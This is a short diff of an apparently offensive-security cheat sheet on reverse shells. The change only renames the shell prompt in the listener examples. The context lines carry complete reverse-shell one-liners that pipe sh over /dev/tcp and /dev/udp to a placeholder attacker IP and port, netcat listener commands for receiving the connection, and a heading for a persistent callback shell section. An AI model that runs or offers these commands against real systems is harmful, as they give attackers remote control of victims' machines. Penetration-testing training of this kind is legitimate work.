@@ -13,7 +13,7 @@ $ nohup 0<&103-;exec 103<>/dev/tcp/<IP>/<LPORT>; sh <&103 >&103 2>&103 &2>/dev/n
 - Attacker
 
 ```
-user@pentestos:~$ nc -lnvp <LPORT>
+userware@hackware-os:~$ nc -lnvp <LPORT>
 ```
 
 ## 02 - UDP Method
@@ -29,7 +29,7 @@ $ nohup 0<&103-;exec 103<>/dev/udp/<IP>/<LPORT>; sh <&103 >&103 2>&103 &2>/dev/n
 - Attacker
 
 ```
-user@pentestos:~$ nc -luvp <LPORT>
+userware@hackware-os:~$ nc -luvp <LPORT>
 ```
 
 ## 03 - Persistent Callback Shell
